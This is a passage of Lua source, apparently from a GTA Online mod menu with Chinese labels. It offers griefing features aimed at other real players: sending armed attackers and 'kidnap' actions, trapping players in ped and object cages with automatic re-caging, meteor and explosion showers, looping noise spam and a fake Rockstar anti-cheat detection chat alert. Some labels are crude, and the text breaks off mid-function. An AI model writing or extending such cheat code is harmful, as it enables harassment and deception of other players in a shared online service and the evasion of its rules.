	weaponList = WeaponList.new(attacker_trolling, "设置武器", "", "", nil, true)

	menu.action(attacker_trolling, "派遣敌人", {}, "", function()
        spawn_attacker_click(pid)
	end)

	menu.slider(attacker_trolling, "数量", {}, "",1, 10, 1, 1, function(value)
        spawn_attacker_count(value)
    end)

	menu.action(attacker_trolling, "派遣警车", {}, "", function()
        spawn_police_car(pid)
	end)

	menu.toggle(attacker_trolling, "无敌攻击者", {}, "",function(toggle)
        send_attacker_god(toggle)
    end)

	menu.toggle(attacker_trolling, "固定的", {}, "",function(toggle)
        send_attacker_stay(toggle) 
    end)

	menu.action(attacker_trolling, "删除攻击者", {}, "", function()
        attacker_dele()
	end)

    menu.list_action(npctrolls_root, "拖车", {"towcar"}, "他们没有付房租。", tow_options, function(index, value, click_type)
        towcarpro(pid, index, value)
    end)

    menu.action(npctrolls_root, "喵喵炸弹", {"meow"}, "UWU", function(on_click)
        meowbmob(pid)
    end)

    menu.action(npctrolls_root, "召唤马里亚奇乐队", {"mariachiband"}, "", function(click_type)
        dispatch_mariachi(pid)
    end)

    menu.action(npctrolls_root, "NPC偷最后一辆车v3.0", {"npcjack"}, "派一个NPC去偷他们的车", function(on_click)
        npc_jack(pid, false)
    end)

    menu.list_action(npctrolls_root, "派一个自定义的妓女来", {"customhooker"}, "发送一个可实际使用的自定义妓女。这只适用于联机。", custom_hooker_options, function(index, value, click_type)
        sendsexgirl(pid, index, value)
    end)

    menu.list_action(npctrolls_root, "绑架", {"kidnap"}, "", kidnap_types, function(index, value)
        kidnapplayer(pid, index,value)
    end)

    menu.action(npctrolls_root, "告诉附近的警察逮捕他们", {"arrest"}, "告诉附近的警察逮捕那个玩家。很明显，GTA在线模式中没有逮捕功能。所以他们实际上没有逮捕。但他们会努力的。", function(on_click)
        tellpolicetocatch(pid)
    end)

    menu.list_action(npctrolls_root, "在车里装满行人", {"fillcar"}, "用附近的行人填充玩家的车", fill_with_options, function(index, value, click_type)
        npcfillthecar(pid, index,value)
    end)


	menu.action(npctrolls_root, "苦力怕小丑(MC里的爬行者)", {"creeper"}, "产生一个小丑，让他跑向玩家并在附近爆炸", function()
		creep(pid)
	end, nil, nil, COMMANDPERM_RUDE)

	menu.action(npctrolls_root, "派遣劫匪", {}, "", function()
        sendmugger_npc(pid)
	end)

	menu.action(npctrolls_root, "派遣雇佣兵", {}, "", function()
        sendkiller(pid)
	end)


lz = menu.list(playerMain, "笼子恶搞", {""}, "") 

local wall = {invis = false}
local set = {alert = true}
cage_table = {}
local pedset = {mdl = 'u_m_m_jesus_01'}
local pedca =  menu.toggle_loop(lz, 'Ped笼子', {'PCAGE'}, '将玩家困在Ped笼子里', function ()
local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
local pname = PLAYER.GET_PLAYER_NAME(pid)
if not cage_table[pid] then
    local peds = {}
    local pedhash = util.joaat(pedset.mdl)
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
    Delcar(targets, spec, pid)

    local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(peds,  spawned_ped)
    end

SetPedCoor(peds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
SetPedCoor(peds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
SetPedCoor(peds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
SetPedCoor(peds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

if wall.invis then
    for index, ent in ipairs(peds) do
        ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
    end
end


if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(peds[1], peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8])
elseif pedhash == util.joaat('player_two') then
    Trevortime(peds)
elseif pedhash == util.joaat('u_m_m_jesus_01') then
    Jesuslovesyou(peds)  
elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
if GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_FUCK_YOU') ==true
then Fuckyou(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Provoke_Trespass')
then Provoke(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'Generic_Insult_High')
then Insulthigh(peds)

elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(peds[1], 'GENERIC_WAR_CRY')
then Warcry(peds)
else
end
end

      -----------Anim-------------------------
    Streamanim('rcmpaparazzo_2')
    Streamanim('mp_player_int_upperfinger')
    Streamanim('misscarsteal2peeing')
    Streamanim('mp_player_int_upperpeace_sign')
    local ped_anim = {peds[2], peds[3], peds[4], peds[5], peds[6], peds[7], peds[8]}
    for _, Pedanim in ipairs(ped_anim) do
        if pedhash == util.joaat('player_two') then
            Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
           local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
            Streamptfx('core')
           GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
        elseif pedhash == util.joaat('u_m_m_jesus_01') then
            Runanim(peds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
            Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
        else
            Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
            Runanim(peds[1], 'rcmpaparazzo_2', 'shag_loop_a')
        end

end


for _, Pedm in ipairs(peds) do
    PFP(Pedm, targets)
end
cage_table[pid] = peds
end

while cage_table[pid] do
IPM(targets, tar1, pname, cage_table, pid)
end

if not players.exists(pid) then
    if set.alert then
        util.toast('你让他们怒不可遏')
    end
    util.stop_thread()

    cage_table[pid] = nil
    end
end)

local PedClist = menu.list(lz, '选择Ped笼子', {}, '如果他们移动或删除当前Ped,请更改Ped样式')

menu.action(lz, '解除Ped笼', {'FreePedcage'}, '将玩家从Ped笼子中释放', function ()
    if cage_table[pid] then
        DelEnt(cage_table[pid])
        menu.set_value(pedca, false)
        cage_table[pid] = false
        else
             if set.alert then
                util.toast('未找到Ped笼子')
             end
    end
end)

pcages = {}
rcage_table = {}
CombineTables(AMC, AfC, CSP, GM, Mpp, MSF, MCM, SMC, Ssf, Ssm, Dlcp, pcages)
local rpedca =  menu.toggle_loop(lz, '随机Ped笼', {'RAMDOMPCAGE'}, '将玩家困在一个随机的Ped笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)
  if not rcage_table[pid] then
      local rpeds = {}
      local rpedind = math.random(1, #pcages)
      local rpedset = pcages[rpedind]
      local pedhash = util.joaat(rpedset)
      local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
      Delcar(targets, spec, pid)

      local ped_tab = {'p1', 'p2', 'p3', 'p4', 'p5', 'p6', 'p7', 'p8'}
    for _, spawned_ped in ipairs(ped_tab) do
        spawned_ped = Pedspawn(pedhash, tar1)
        table.insert(rpeds,  spawned_ped)
    end




    SetPedCoor(rpeds[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
    SetPedCoor(rpeds[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
    SetPedCoor(rpeds[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

    if wall.invis then
        for index, ent in ipairs(rpeds) do
            ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
        end
    end


  if pedhash == util.joaat('IG_LesterCrest')  then
    Teabagtime(rpeds[1], rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8])
  elseif pedhash == util.joaat('player_two') then
      Trevortime(rpeds)
  elseif pedhash == util.joaat('u_m_m_jesus_01') then
      Jesuslovesyou(rpeds)  
  elseif pedhash ~= util.joaat('IG_LesterCrest') or util.joaat('player_two') then
  if GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_FUCK_YOU') ==true
  then Fuckyou(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Provoke_Trespass')
  then Provoke(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'Generic_Insult_High')
  then Insulthigh(rpeds)

  elseif GENERIC_AUDIO.DOES_CONTEXT_EXIST_FOR_THIS_PED(rpeds[1], 'GENERIC_WAR_CRY')
  then Warcry(rpeds)
  else
  end
  end

        -----------Anim-------------------------
      Streamanim('rcmpaparazzo_2')
      Streamanim('mp_player_int_upperfinger')
      Streamanim('misscarsteal2peeing')
      Streamanim('mp_player_int_upperpeace_sign')
      local ped_anim = {rpeds[2], rpeds[3], rpeds[4], rpeds[5], rpeds[6], rpeds[7], rpeds[8]}
      for _, Pedanim in ipairs(ped_anim) do
          if pedhash == util.joaat('player_two') then
              Runanim(Pedanim, 'misscarsteal2peeing','peeing_loop')
             local tre = PED.GET_PED_BONE_INDEX(Pedanim, 0x2e28)
              Streamptfx('core')
             --credits to saltyscript for gfx part
             GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", Pedanim, 0, 0, 0, -90, 0, 0, tre, 2, false, false, false)
          elseif pedhash == util.joaat('u_m_m_jesus_01') then
              Runanim(rpeds[1], 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
              Runanim(Pedanim, 'mp_player_int_upperpeace_sign', 'mp_player_int_peace_sign')
          else
              Runanim(Pedanim, 'mp_player_int_upperfinger', 'mp_player_int_finger_02_fp')
              Runanim(rpeds[1], 'rcmpaparazzo_2', 'shag_loop_a')
          end

  end


  for _, Pedm in ipairs(rpeds) do
      PFP(Pedm, targets)
  end

  rcage_table[pid] = rpeds
  end

 while rcage_table[pid] do
  IPM(targets, tar1, pname, rcage_table, pid)
 end

  if not players.exists(pid) then

    if set.alert then
        util.toast('你让他们怒不可遏')
    end
    util.stop_thread()

    rcage_table[pid] = nil
    end
end)

menu.action(lz, '解除随机Ped笼', {'FreeRPedcage'}, '从随机Ped笼子中释放玩家', function ()
      if rcage_table[pid] then
          DelEnt(rcage_table[pid])
          menu.set_value(rpedca, false)
          rcage_table[pid] = false
          else
               if set.alert then
                  util.toast('未找到Ped笼子')
               end
      end
  end)

  obj_table = {}
  local objset = {mdl = 'prop_mineshaft_door'}
  local objca = menu.toggle_loop(lz, '物体笼子', {'ObjCage'}, '将玩家困在物体笼子里', function ()
  local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
  local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
  local pname = PLAYER.GET_PLAYER_NAME(pid)

  if not obj_table[pid] then
      local objs = {}

      local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
      Delcar(targets, spec, pid)
      
local hsel = util.joaat(objset.mdl)
      Streament(hsel)
      local obj_tab = {'o1', 'o2', 'o3', 'o4', 'o5', 'o6', 'o7', 'o8'}
      for _, spawned_obj in ipairs(obj_tab) do
          spawned_obj =  ObjFrezSpawn(hsel, tar1)
          table.insert(objs,  spawned_obj)
      end
      obj_table[pid] = objs

      SetObjCo(objs[1], tar1.x, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[2], tar1.x - 0.5, tar1.y - 0.5, tar1.z - 1.0)
      SetObjCo(objs[3], tar1.x - 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[4], tar1.x - 0.5, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[5], tar1.x, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[6], tar1.x + 0.5, tar1.y + 0.5, tar1.z - 1.0)
      SetObjCo(objs[7], tar1.x + 0.5, tar1.y, tar1.z - 1.0)
      SetObjCo(objs[8], tar1.x + 0.5, tar1.y - 0.5, tar1.z - 1.0)

      ENTITY.SET_ENTITY_ROTATION(objs[1], 0, 0, 180, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[2], 0, 0, 135, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[3], 0, 0, 90, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[4], 0, 0, 45, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[6], 0, 0, 315, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[7], 0, 0, 270, 1, true)
      ENTITY.SET_ENTITY_ROTATION(objs[8], 0, 0, 225, 1, true)

      if wall.invis then
        for index, ent in ipairs(objs) do
            ENTITY.SET_ENTITY_VISIBLE(ent, false, 0)
        end
    end

      for _, horn in ipairs(objs) do
          AUDIO.PLAY_SOUND_FROM_ENTITY(-1, 'Alarm_Interior', horn, 'DLC_H3_FM_FIB_Raid_Sounds', 0, 0)
      end

  end
while obj_table[pid] do
  IPM(targets, tar1, pname, obj_table, pid)
end

if not players.exists(pid) then

  if set.alert then
      util.toast('你让他们怒不可遏')
  end
  util.stop_thread()

  obj_table[pid] = nil
end

end)

local ObjSlist = menu.list(lz, '更改物体笼子样式', {}, '如果他们移动或删除当前物体,请更改物体样式')

menu.action(lz, '解除物体笼子', {'FreeObjcage'}, '将玩家从物体笼子中释放', function ()
  if obj_table[pid] then
      DelEnt(obj_table[pid])
      menu.set_value(objca, false)
      Stopsound()
      obj_table[pid] = false
      else
          if set.alert then
              util.toast('未找到物体笼子')    
          end
  end

end)

menu.list_action(PedClist, '特殊NPC', {''}, '更改Ped样式为自定义NPC', SPClist, function(pedsel)
    pedset.mdl = SPC[pedsel]
end)

menu.list_action(PedClist, '游戏中的女性NPC', {''}, '更改Ped样式为游戏中的女性NPC', AfClist, function(pedsel)
    pedset.mdl = AfC[pedsel]
end)

menu.list_action(PedClist, '游戏中的男性NPC', {''}, '更改Ped样式为游戏中的男性NPC', AMClist, function(pedsel)
    pedset.mdl = AMC[pedsel]
end)

menu.list_action(PedClist, '过场动画NPC', {''}, '更改Ped样式为游戏中的过场动画NPC(非必要不使用)', Csplist, function(pedsel)
    pedset.mdl = CSP[pedsel]
end)

menu.list_action(PedClist, '帮派成员', {''}, '更改Ped样式为游戏中的帮派成员', GMlist, function(pedsel)
    pedset.mdl = GM[pedsel]
end)

menu.list_action(PedClist, '在线模式中的NPC', {''}, '更改Ped样式为在线模式中的NPC', Mpplist, function(pedsel)
    pedset.mdl = Mpp[pedsel]
end)

menu.list_action(PedClist, '在线模式过场动画中的女性NPC', {''}, '更改Ped样式为在线模式过场动画中的女性NPC', MSFlist, function(pedsel)
    pedset.mdl = MSF[pedsel]
end)

menu.list_action(PedClist, '在线模式过场动画中的男性NPC', {''}, '更改Ped样式为在线模式过场动画中的男性NPC', MCMlist, function(pedsel)
    pedset.mdl = MCM[pedsel]
end)

menu.list_action(PedClist, '故事模式角色', {''}, '更改Ped样式为故事模式角色', SMClist, function(pedsel)
    pedset.mdl = SMC[pedsel]
end)

menu.list_action(PedClist, '故事模式过场动画女性NPC', {''}, '更改Ped样式为故事模式过场动画女性NPC', Ssflist, function(pedsel)
    pedset.mdl = Ssf[pedsel]
end)

menu.list_action(PedClist, '故事模式过场动画男性NPC', {''}, '更改Ped样式为故事模式过场动画男性NPC', Ssmlist, function(pedsel)
    pedset.mdl = Ssm[pedsel]
end)

menu.list_action(PedClist, 'DLC中的NPC', {''}, '更改Ped样式为DLC中的NPC', Dlcplist, function(pedsel)
    pedset.mdl = Dlcp[pedsel]
end)

menu.list_action(ObjSlist, '路牌', {''}, '更改物体样式为路牌', Siglist, function(objsel)
    objset.mdl = Sigha[objsel]
end)

menu.list_action(ObjSlist, '门', {''}, '更改物体样式为门', Dolist, function(objsel)
    objset.mdl = Doha[objsel]
end)

menu.list_action(ObjSlist, '室内道具', {''}, '更改物体样式为室内道具', Interlist, function(objsel)
    objset.mdl = Intob[objsel]
end)

menu.list_action(ObjSlist, '外部道具', {''}, '更改物体样式为外部道具', Extlist, function(objsel)
    objset.mdl = Extob[objsel]
end)

menu.toggle(lz, '看不见的墙', {}, '将使Ped笼子、物体笼子和随机Ped笼子隐形', function (on)
    wall.invis = on
end)

menu.action(lz, "笼子", {""}, "", function ()
ptlz(pid)
end)
menu.action(lz, "七度空间", {""}, "", function ()
qdkj(pid)
end)
menu.action(lz, "钱笼子", {""}, "", function ()
zdlz(pid)
end)
menu.action(lz, "垃圾箱", {""}, "", function ()
yylz(pid)
end)
menu.action(lz, "小车车", {""}, "", function ()
cclz(pid)
end)
menu.action(lz, "圣诞快乐", {""}, "", function ()
sdkl1(pid)
end)
menu.action(lz, "圣诞快乐pro", {""}, "", function ()
sdkl2(pid)
end)
menu.action(lz, "圣诞快乐promax", {""}, "", function ()
sdkl3(pid)
end)
menu.action(lz, "电击笼", {""}, "", function ()
powercage(pid)
end)
menu.action(lz, "竞技管", {""}, "", function ()
jjglz(pid)
end)
menu.action(lz, "英国女王笼子", {""}, "", function(cl)
gueencage(pid)
end)

menu.action(lz, "运输集装箱", {"cage123"}, "", function()
chestcage(pid)
end)

menu.action(lz, "载具笼子", {"cage4321"}, "", function()
    vehcagelol(pid)
end)

menu.action(lz, "燃气笼", {"gascage4321"}, "", function()
gascage(pid)
end)

menu.toggle(lz, "新世纪全自动化套笼", {"autocage"}, "自动套笼子", function(on)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
    cage_loop = on
    if cage_loop then
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
            util.yield(300)
            if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
                notification("踢出载具失败", colors.red)
                menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
                return
            end
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        end
        cage_player(a)
    end
    while cage_loop do
        local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 
        local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
        if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 
            a = b
            if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
                goto continue
            end
            cage_player(a)
            notification(PLAYER.GET_PLAYER_NAME(pid).."跑出来了，再次套住", colors.blue)
            ::continue::
        end
        util.yield(1000)
    end
end)

menu.action(lz, "删除笼子", {""}, "只能删除简单的笼子", function()
            for key, value in pairs(cages) do
                entities.delete_by_handle(value)
            end
            local entitycount = 0
            for i, object in ipairs(spawned_objects) do
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
                entities.delete_by_handle(object)
                spawned_objects[i] = nil
                entitycount += 1
            end
            util.toast("清除笼子完成")
    end)
	
local ptfxmenu = menu.list(playerMain, '粒子效果轰炸', {}, '')

menu.toggle_loop(ptfxmenu, '粒子效果轰炸', {}, '发送您选择的粒子效果', function ()
    ftpxspam(pid)
end)

menu.list_action(ptfxmenu, '类型', {''}, '在列表中选择粒子类型', Fxcorelist, function(fxsel)
    ftpxspam_set(fxsel)
end)

local metmenu = menu.list(playerMain, '模型生成', {}, '')

local bigolist = {} 
local bigobjset  = {obj= util.joaat('prop_asteroid_01'), ptfx = false, exp = false, speed = 1000}
menu.toggle_loop(metmenu, '模型生成', {'Oshower'}, '在天空下模型雨', function ()
    
    local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local oha = bigobjset.obj --credits to lance#8011 for this function
    local r1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 300.0)
    local r2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS( targets, math.random(-500, 500), math.random(-500, 500), 0)
    local diff = {}
    diff.x = (r2.x - r1.x)*500
    diff.y = (r2.y - r1.y)*500
    diff.z = (r2.z - r1.z)*500
    Streament(oha)
    local bigobj = OBJECT.CREATE_OBJECT(oha, r1.x, r1.y, r1.z, true, true, true)
    ENTITY.SET_ENTITY_HAS_GRAVITY(bigobj, true)
    ENTITY.APPLY_FORCE_TO_ENTITY(bigobj, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
    OBJECT.SET_OBJECT_PHYSICS_PARAMS(bigobj, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
    util.yield(100)

    bigolist[#bigolist + 1] = bigobj
    for _, met in ipairs(bigolist) do
        local mcoor = ENTITY.GET_ENTITY_COORDS(met)
    if ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(bigolist) < 0.5 then
        Streamptfx("scr_xm_orbital")
        if bigobjset.exp then
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 8, 100, true, bigobjset.ptfx, 1, false)
            FIRE.ADD_EXPLOSION(mcoor.x, mcoor.y, mcoor.z, 59, 100, true, bigobjset.ptfx, 1, false)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD('scr_xm_orbital_blast', mcoor.x, mcoor.y, mcoor.z + 10, 0, 180, 0, 10.0, true, true, true)
        end
    end
end
if #bigolist > 175 then
    DelEnt(bigolist)
    bigolist= {}
end
    util.yield(bigobjset.speed)
    if not players.exists(pid) then
        util.stop_thread()
    end

end)

menu.toggle(metmenu, '天基炮爆炸', {''}, '在下模型雨时开启天基炮爆炸', function (on)
    bigobjset.exp = on
end)

menu.slider(metmenu, '生成延迟', {''}, '调整模型生成延迟', 0, 3000, 1000, 100, function (s)
    bigobjset.speed = s
end)

menu.list_action(metmenu, '模型列表', {''}, '改变模型秀的模型', Bigobjlist, function(objsel)
    bigobjset.obj = util.joaat(Bigobj[objsel])
end)


    local soundtrolls_root = menu.list(playerMain, "声音恶搞", {"soundtrolling"}, "")

    menu.list_action(soundtrolls_root, "语音恶搞", {"voicetrolls"}, "", {"庞森比女士迪丝", "基夫隆", "辱骂"}, function(index, value, click_type)
        local voice
        local speech
        local z_off = 0
        if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
            z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
        end
        pluto_switch index do
            case 1:
                voice = "S_F_M_SHOP_HIGH_WHITE_MINI_01"
                speech = "BUMP"
                break
            case 2:
                voice = "A_F_M_BEACH_01_WHITE_FULL_01"
                speech = "KIFFLOM_GREET"
                break
            case 3: 
                voice = ""
                speech = "GENERIC_INSULT_HIGH_01"
        end
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0+z_off)
        --AUDIO.PLAY_AMBIENT_SPEECH_FROM_POSITION_NATIVE(speech, voice, coords.x, coords.y, coords.z, "SPEECH_PARAMS_FORCE_SHOUTED")
        request_model_load(util.joaat("s_f_m_shop_high"))
        local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
        ENTITY.SET_ENTITY_ALPHA(voice_ped, 0, false)
        ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
        ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE", 0)
        util.yield(5000)
        entities.delete_by_handle(voice_ped)
    end)

    menu.toggle_loop(soundtrolls_root, "笑声折磨", {"torment"}, "他们会反复听到笑声。", function()
        laughsound(pid)
    end)

    menu.toggle_loop(soundtrolls_root, "耳朵强奸犯", {}, "一次发出很少的声音来强奸他们的耳朵", function()
        local player = PLAYER.GET_PLAYER_PED(pid)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Crash", player, "WASTEDSOUNDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BED", player, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BASE_JUMP_PASSED", player, "HUD_AWARDS", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Fail", player, "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Beep_Red", player, "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(20)
    end)

    menu.toggle_loop(soundtrolls_root, "浪费了", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BED", PLAYER.GET_PLAYER_PED(pid), "WastedSounds", true, true)
        util.yield(5800)
    end)

    menu.toggle_loop(soundtrolls_root, "游艇喇叭", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Horn", PLAYER.GET_PLAYER_PED(pid), "DLC_Apt_Yacht_Ambient_Soundset", true, true)
        util.yield(900)
    end)

    menu.toggle_loop(soundtrolls_root, "任务成功", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "BASE_JUMP_PASSED", PLAYER.GET_PLAYER_PED(pid), "HUD_AWARDS", true, true)
        util.yield(1250)
    end)

    menu.toggle_loop(soundtrolls_root, "越界计时器", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Out_of_Bounds_Explode", PLAYER.GET_PLAYER_PED(pid), "MP_MISSION_COUNTDOWN_SOUNDSET", true, true)
        util.yield(5000)
    end)

    menu.toggle_loop(soundtrolls_root, "防空系统启动", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)

    menu.toggle_loop(soundtrolls_root, "防空系统停用", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defenses_Disabled", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(2000)
    end)

    menu.toggle_loop(soundtrolls_root, "破解失败", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Fail", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "破解成功", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Hack_Success", PLAYER.GET_PLAYER_PED(pid), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "掉电", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Power_Down", PLAYER.GET_PLAYER_PED(pid), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(1500)
    end)

    menu.toggle_loop(soundtrolls_root, "哔哔声", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Beep_Green", PLAYER.GET_PLAYER_PED(pid), "DLC_HEIST_HACKING_SNAKE_SOUNDS", true, true)
        util.yield(1500)
    end)

	menu.toggle_loop(soundtrolls_root, "超市他", {""}, "st", function()
        stcnm(pid)
    end)
	
	menu.toggle_loop(soundtrolls_root, "手机按键（自己听得到）", {""}, "st", function()
        phonesoundcnm(pid)
    end)	

    local chattrolls_root = menu.list(playerMain, "聊天恶搞", {}, "")

    menu.divider(chattrolls_root, "-=-=-=-Rockstar反作弊-=-=-=-")

    menu.action(chattrolls_root, "虚假RAC检测聊天", {}, "用户触发检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
